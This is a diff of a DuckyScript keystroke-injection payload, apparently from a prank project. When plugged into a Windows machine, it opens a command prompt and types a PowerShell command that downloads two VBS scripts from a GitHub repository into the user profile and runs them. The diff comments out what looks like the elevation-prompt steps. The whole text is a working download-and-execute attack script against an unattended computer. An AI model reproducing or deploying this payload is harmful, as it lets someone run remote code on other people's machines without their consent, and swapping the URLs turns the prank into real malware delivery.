@@ -8,14 +8,14 @@ CONTROL ESCAPE
 DELAY 300
 STRING cmd
 DELAY 700
-MENU
-DELAY 300
-DOWNARROW
-DELAY 300
+REM MENU
+REM DELAY 300
+REM DOWNARROW
+REM DELAY 300
 ENTER
 
-DELAY 500
-ALT y
+REM DELAY 500
+REM ALT y
 
 DELAY 600
 STRING powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/volup.vbs','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && exit
